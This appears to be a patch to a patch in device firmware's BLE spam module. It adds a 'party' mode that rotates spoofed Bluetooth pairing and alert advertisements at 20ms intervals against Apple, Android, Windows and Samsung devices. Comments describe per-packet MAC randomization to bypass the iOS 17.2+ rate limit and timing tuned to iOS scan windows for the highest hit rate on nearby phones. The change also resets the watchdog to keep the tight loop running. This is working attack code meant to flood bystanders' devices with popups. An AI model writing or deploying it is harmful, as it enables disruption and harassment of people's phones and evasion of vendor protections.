@@ -24107,7 +24107,7 @@ index 0000000..bafd4e4
 +
 +#endif
 diff --git a/src/modules/ble/ble_spam.cpp b/src/modules/ble/ble_spam.cpp
-index a702b84..3a1e755 100644
+index a702b84..e4e8bd0 100644
 --- a/src/modules/ble/ble_spam.cpp
 +++ b/src/modules/ble/ble_spam.cpp
 @@ -569,7 +569,8 @@ enum BleSpamAttackType {
@@ -24135,7 +24135,7 @@ index a702b84..3a1e755 100644
          case BLE_SPAM_ATTACK_SAMSUNG:
              return sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0]);
 +        case BLE_SPAM_ATTACK_PARTY:
-+            return "All Devices — rotating";
++            return 1; // single "rotating" entry; menu bypasses device list anyway
          case BLE_SPAM_ATTACK_BLE_BEACON: {
              int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
              std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
@@ -24148,42 +24148,66 @@ index a702b84..3a1e755 100644
          case BLE_SPAM_ATTACK_BLE_BEACON: {
              int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
              if (index >= 0 && index < nPresets) return BLE_SPAM_BEACON_PRESETS[index];
-@@ -1455,6 +1461,8 @@ static bool bleSpamBuildAdvertisementData(
+@@ -1455,6 +1461,13 @@ static bool bleSpamBuildAdvertisementData(
              advertisementData = AdvData;
              return true;
          }
-+        case BLE_SPAM_ATTACK_PARTY:
-+            return "All Devices — rotating";
++        case BLE_SPAM_ATTACK_PARTY: {
++            // Fallback: if ever called directly, pick a random real type
++            BleSpamAttackType rndType = BLE_SPAM_ATTACK_APPLE_PAIRING;
++            int rndIdx = 0;
++            bleSpamPickRandomSelection(rndType, rndIdx);
++            return bleSpamBuildAdvertisementData(rndType, rndIdx, advertisementData);
++        }
          case BLE_SPAM_ATTACK_BLE_BEACON: {
              advertisementData = BLEAdvertisementData();
              int nBeaconPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
-@@ -1662,7 +1670,24 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
+@@ -1662,7 +1675,35 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
          BleSpamAttackType attackType = selection.attack_type;
          int deviceIndex = selection.device_index;
  
 -        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
 +        if (selection.attack_type == BLE_SPAM_ATTACK_PARTY) {
-+            // Party: cycle through all types rapidly for wide impact (affects many devices at once)
-+            static uint32_t partyLastSwitch = 0;
-+            static BleSpamAttackType partyCurrent = BLE_SPAM_ATTACK_APPLE_PAIRING;
-+            uint32_t nowMs = millis();
-+            if (nowMs - partyLastSwitch > 700 || partyLastSwitch == 0) {
-+                const BleSpamAttackType partyPool[] = {BLE_SPAM_ATTACK_APPLE_PAIRING, BLE_SPAM_ATTACK_APPLE_ACTION, BLE_SPAM_ATTACK_ANDROID_ALERT, BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR, BLE_SPAM_ATTACK_SAMSUNG, BLE_SPAM_ATTACK_BLE_BEACON};
-+                partyCurrent = partyPool[random(0, 6)];
-+                partyLastSwitch = nowMs;
-+                // LED sync: color per type
-+                #ifdef HAS_RGB_LED
-+                // will be handled in runScreen via leds
-+                #endif
++            // Party: per-packet round-robin for max hit rate (research: 20ms interval 68% spam vs 100ms 29%)
++            // 6 types * (adv20+gap5=25ms) = 150ms apple cadence matching iOS 152.5ms scan window (issue #2153)
++            // MAC randomized every packet (iOS 17.2+ rate-limit bypass) + dynamic payload (MarlinSchuck)
++            static uint8_t partyIdx = 0;
++            const BleSpamAttackType partyPool[] = {
++                BLE_SPAM_ATTACK_APPLE_PAIRING,
++                BLE_SPAM_ATTACK_APPLE_ACTION,
++                BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE,
++                BLE_SPAM_ATTACK_ANDROID_ALERT,
++                BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
++                BLE_SPAM_ATTACK_SAMSUNG
++            };
++            // BLE_BEACON excluded from tight party (fills 31B, no FastPair popup); keep 6 high-impact types
++            attackType = partyPool[partyIdx % 6];
++            partyIdx++;
++            // per-type device random: don't go through bleSpamPickRandomSelection (which mixes types)
++            if (attackType == BLE_SPAM_ATTACK_APPLE_PAIRING || attackType == BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE) {
++                deviceIndex = random(APPLE_PROXIMITY_DEVICE_COUNT);
++            } else if (attackType == BLE_SPAM_ATTACK_APPLE_ACTION) {
++                deviceIndex = random((int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES)/sizeof(BleSpamAppleDevice)));
++            } else if (attackType == BLE_SPAM_ATTACK_ANDROID_ALERT) {
++                deviceIndex = random(2); // Pixel / Generic (exclude sentinel)
++            } else if (attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) {
++                deviceIndex = random((int)(sizeof(BLE_SPAM_WINDOWS_PRESETS)/sizeof(BLE_SPAM_WINDOWS_PRESETS[0])));
++            } else if (attackType == BLE_SPAM_ATTACK_SAMSUNG) {
++                deviceIndex = random(2); // Buds / Watch
 +            }
-+            attackType = partyCurrent;
-+            // pick random device within that type for max variety
-+            bleSpamPickRandomSelection(attackType, deviceIndex);
 +        } else if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
              bleSpamPickRandomSelection(attackType, deviceIndex);
          }
  
-@@ -2228,8 +2253,15 @@ static void bleSpamMenuUi() {
+@@ -1693,6 +1734,7 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
+         state.packet_counter++;
+         state.sent_count++;
+         state.window_packets++;
++        esp_task_wdt_reset(); // keep alive at 20ms tight loop
+     }
+ }
+ 
+@@ -2228,8 +2270,15 @@ static void bleSpamMenuUi() {
          selection.device_index = 0;
  
          // Types that go straight to config without a device list
